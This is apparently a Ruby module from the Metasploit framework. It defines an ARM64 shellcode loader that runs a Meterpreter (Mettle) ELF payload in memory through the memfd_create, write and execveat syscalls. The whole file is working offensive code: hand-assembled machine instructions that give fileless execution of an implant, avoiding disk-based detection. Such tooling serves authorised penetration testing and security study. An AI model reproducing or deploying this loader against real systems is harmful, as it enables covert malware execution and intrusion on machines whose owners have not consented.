#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
# ARM64 conventions
# Parameters: x0-x7
# Syscall offset: x8
# Return Address for BL: x30

module Msf::Payload::Linux::Aarch64::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader = [
      # fd = memfd_create(NULL,MFD_CLOEXEC) 
      0x0a0080d2, # 0x1000:	mov	x10, #0	0x0a0080d2
      0xea0300f9, # 0x1004:	str	x10, [sp]	0xea0300f9
      0xe0030091, # 0x1008:	mov	x0, sp	0xe0030091
      0x210080d2, # 0x100c:	mov	x1, #1	0x210080d2
      0xe82280d2, # 0x1010:	mov	x8, #0x117	0xe82280d2
      0x010000d4, # 0x1014:	svc	#0	0x010000d4
      0xe90300aa, # 0x1018:	mov	x9, x0	0xe90300aa

      # jump to 0x105c
      0x10000014, # 0x101c:	b	#0x105c	0x10000014

      # write(fd, payload length, payload pointer)
      0xea031eaa, # 0x1020:	mov	x10, x30	0xea031eaa
      0x420140b9, # 0x1024:	ldr	w2, [x10]	0x420140b9
      0x4a110091, # 0x1028:	add	x10, x10, #4	0x4a110091
      0xe1030aaa, # 0x102c:	mov	x1, x10	0xe1030aaa
      0x080880d2, # 0x1030:	mov	x8, #0x40	0x080880d2
      0x010000d4, # 0x1034:	svc	#0	0x010000d4

      # execveat(fd, null,null,null, AT_EMPTY_PATH)
      0xe00309aa, # 0x1038:	mov	x0, x9	0xe00309aa
      0x0a0080d2, # 0x103c:	mov	x10, #0	0x0a0080d2
      0xea0300f9, # 0x1040:	str	x10, [sp]	0xea0300f9
      0xe1030091, # 0x1044:	mov	x1, sp	0xe1030091
      0x020080d2, # 0x1048:	mov	x2, #0	0x020080d2
      0x030080d2, # 0x104c:	mov	x3, #0	0x030080d2
      0x040082d2, # 0x1050:	mov	x4, #0x1000	0x040082d2
      0x282380d2, # 0x1054:	mov	x8, #0x119	0x282380d2
      0x010000d4, # 0x1058:	svc	#0	0x010000d4

      # jump back to 0x1020, the address right after this instruction will be stored in x30
      0xf1ffff97, # 0x105c:	bl	#0x1020	0xf1ffff97
    ].pack('N*')
    in_memory_loader + [payload.length].pack('V*')
  end
end
